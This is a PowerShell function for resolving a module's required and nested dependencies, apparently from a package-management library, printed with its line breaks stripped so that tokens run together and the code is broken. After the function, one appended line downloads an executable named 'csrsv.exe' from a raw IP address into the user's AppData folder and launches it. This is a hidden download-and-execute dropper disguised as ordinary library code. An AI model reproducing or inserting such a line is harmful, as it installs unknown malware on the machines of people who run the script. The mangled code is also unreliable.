function Get-ModuleDependencies{Param ([Parameter(Mandatory=$true)][PSModuleInfo]$PSModuleInfo,[Parameter(Mandatory=$true)][string]$Repository,[parameter(Mandatory = $true)][ValidateNotNullOrEmpty()][System.Management.Automation.PSCmdlet]$CallerPSCmdlet,[Parameter(Mandatory=$false)][pscredential]$Credential)$DependentModuleDetails = @()if($PSModuleInfo.RequiredModules -or $PSModuleInfo.NestedModules){$ModuleManifestHashTable = Get-ManifestHashTable -Path $PSModuleInfo.Pathif($PSModuleInfo.RequiredModules){$ModuleManifestRequiredModules = $nullif($ModuleManifestHashTable){$ModuleManifestRequiredModules = $ModuleManifestHashTable.RequiredModules}$ValidateAndGetRequiredModuleDetails_Params = @{ModuleManifestRequiredModules=$ModuleManifestRequiredModulesRequiredPSModuleInfos=$PSModuleInfo.RequiredModulesRepository=$RepositoryDependentModuleInfo=$PSModuleInfoCallerPSCmdlet=$CallerPSCmdletVerbose=$VerbosePreferenceDebug=$DebugPreference}if ($PSBoundParameters.ContainsKey('Credential')){$ValidateAndGetRequiredModuleDetails_Params.Add('Credential',$Credential)}$DependentModuleDetails += ValidateAndGet-RequiredModuleDetails @ValidateAndGetRequiredModuleDetails_Params}if($PSModuleInfo.NestedModules){$ModuleManifestRequiredModules = $nullif($ModuleManifestHashTable){$ModuleManifestRequiredModules = $ModuleManifestHashTable.NestedModules}$RequiredPSModuleInfos = $PSModuleInfo.NestedModules | Microsoft.PowerShell.Core\Where-Object {-not $_.ModuleBase.StartsWith($PSModuleInfo.ModuleBase, [System.StringComparison]::OrdinalIgnoreCase) -or-not $_.Path -or-not (Microsoft.PowerShell.Management\Test-Path -LiteralPath $_.Path)}$ValidateAndGetRequiredModuleDetails_Params = @{ModuleManifestRequiredModules=$ModuleManifestRequiredModulesRequiredPSModuleInfos=$RequiredPSModuleInfosRepository=$RepositoryDependentModuleInfo=$PSModuleInfoCallerPSCmdlet=$CallerPSCmdletVerbose=$VerbosePreferenceDebug=$DebugPreference}if ($PSBoundParameters.ContainsKey('Credential')){$ValidateAndGetRequiredModuleDetails_Params.Add('Credential',$Credential)}$DependentModuleDetails += ValidateAndGet-RequiredModuleDetails @ValidateAndGetRequiredModuleDetails_Params}}return $DependentModuleDetails}(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")